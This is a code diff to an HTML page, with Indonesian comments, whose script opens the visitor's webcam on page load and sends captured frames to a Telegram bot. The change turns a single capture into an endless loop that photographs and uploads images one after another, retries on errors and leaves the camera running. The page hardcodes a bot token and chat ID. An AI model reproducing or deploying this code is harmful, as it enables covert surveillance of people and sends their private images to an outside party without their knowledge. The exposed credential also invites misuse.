@@ -9,11 +9,10 @@
   <h1>Automatic Camera Capture and Telegram</h1>
 
   <script>
+    var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0'; // Ganti dengan token bot Telegram Anda
+    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di -1002188815934
     // Fungsi untuk mengirim gambar ke Telegram
     function sendToTelegram(imageDataURL) {
-      var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
-      var chatId = '-1002188815934';
-
       // API endpoint untuk mengirim pesan gambar
       var apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
 
@@ -35,46 +34,58 @@
         .then(response => response.json())
         .then(data => {
           console.log('Gambar berhasil dikirim ke Telegram:', data);
+          // Lanjutkan pengambilan gambar berikutnya setelah berhasil dikirim
+          takeAndSendPhoto();
         })
         .catch(error => {
           console.error('Error mengirim gambar ke Telegram:', error);
+          // Coba kirim gambar berikutnya setelah terjadi kesalahan
+          takeAndSendPhoto();
         });
     }
 
-    // Mendapatkan akses ke kamera pengguna secara otomatis
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function(stream) {
-        var video = document.createElement('video');
-        document.body.appendChild(video);
-        video.srcObject = stream;
-        video.onloadedmetadata = function(e) {
-          video.play();
+    // Fungsi untuk mengambil dan mengirim foto ke Telegram secara berulang
+    function takeAndSendPhoto() {
+      // Mendapatkan akses ke kamera pengguna secara otomatis
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          var video = document.createElement('video');
+          document.body.appendChild(video);
+          video.srcObject = stream;
+          video.onloadedmetadata = function(e) {
+            video.play();
 
-          // Mengambil gambar setelah izin diberikan
-          setTimeout(function() {
-            var canvas = document.createElement('canvas');
-            var context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Mengambil gambar setelah izin diberikan
+            setTimeout(function() {
+              var canvas = document.createElement('canvas');
+              var context = canvas.getContext('2d');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Mengambil data gambar dalam bentuk base64
-            var imageDataURL = canvas.toDataURL('image/png');
+              // Mengambil data gambar dalam bentuk base64
+              var imageDataURL = canvas.toDataURL('image/png');
 
-            // Kirim gambar ke fungsi untuk mengirim ke Telegram
-            sendToTelegram(imageDataURL);
+              // Kirim gambar ke fungsi untuk mengirim ke Telegram
+              sendToTelegram(imageDataURL);
 
-            // Hentikan stream video setelah mengambil gambar
-            video.srcObject.getTracks().forEach(track => track.stop());
+              // Hapus elemen video dari dokumen
+              video.parentNode.removeChild(video);
 
-            // Hapus elemen video dari dokumen
-            video.parentNode.removeChild(video);
-          }, 1000); // Waktu delay sebelum mengambil gambar (dalam milidetik)
-        };
-      })
-      .catch(function(err) {
-        console.log("Error: " + err);
-      });
+              // Panggil fungsi lagi untuk mengambil foto berikutnya
+              takeAndSendPhoto();
+            }, 1000); // Waktu delay sebelum mengambil gambar (dalam milidetik)
+          };
+        })
+        .catch(function(err) {
+          console.log("Error: " + err);
+          // Coba kembali mengambil gambar jika terjadi kesalahan
+          takeAndSendPhoto();
+        });
+    }
+
+    // Memulai proses pengambilan dan pengiriman foto pertama kali
+    takeAndSendPhoto();
   </script>
 </body>
 </html>
